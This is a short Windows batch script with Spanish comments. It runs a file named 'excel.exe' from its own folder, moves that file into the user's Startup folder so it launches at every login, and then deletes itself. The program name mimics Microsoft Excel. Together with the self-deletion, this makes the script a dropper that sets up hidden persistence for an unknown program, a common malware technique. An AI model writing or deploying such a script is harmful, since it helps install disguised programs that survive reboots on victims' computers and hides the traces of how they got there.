@echo off

set "ruta_bat=%~dp0"
set "nombre_archivo=excel.exe"

start "" "%ruta_bat%%nombre_archivo%"

REM Espera un breve tiempo para asegurarse de que el script se ejecute
timeout /t 2 /nobreak >nul

REM Ruta del archivo que se moverá
set "archivo_origen=%ruta_bat%%nombre_archivo%"

set "carpeta_destino=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Verifica si el archivo existe y lo mueve
if exist "%archivo_origen%" (
    move "%archivo_origen%" "%carpeta_destino%"
    echo El archivo se movio correctamente a la carpeta de inicio.
) else (
    echo El archivo no se encuentra en la ruta especificada.
)

pause

REM Elimina el archivo .bat después de ejecutarse
del "%~f0"
